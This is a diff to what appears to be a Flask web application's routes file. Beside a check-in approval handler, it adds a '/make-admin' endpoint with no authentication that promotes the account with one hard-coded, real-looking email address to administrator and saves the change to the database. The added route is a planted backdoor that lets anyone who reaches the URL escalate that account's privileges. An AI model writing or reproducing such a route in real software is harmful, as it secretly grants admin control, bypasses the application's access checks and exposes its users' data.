@@ -173,6 +173,19 @@ def approve_checkin(checkin_id):
 
     flash("Check-in approved.", "success")
     return redirect(url_for("main.review_checkins"))
+    
+@main.route("/make-admin")
+def make_admin():
+    from app.models import User
+    from app import db
+
+    user = User.query.filter_by(email="drizzydsk@gmail.com").first()
+    if user:
+        user.is_admin = True
+        db.session.commit()
+        return "You are now admin"
+
+    return "User not found"
 
 
 @main.route("/admin/reject/<int:checkin_id>")
